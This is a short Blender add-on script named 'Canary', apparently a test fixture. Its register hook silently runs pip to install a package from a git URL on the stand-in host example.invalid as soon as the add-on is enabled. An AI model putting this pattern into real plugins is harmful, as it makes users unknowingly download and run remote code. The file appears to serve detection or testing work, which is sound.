bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}

import subprocess, sys
def _deps():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "git+https://example.invalid/helper.git"])
def register():
    _deps()
def unregister(): pass
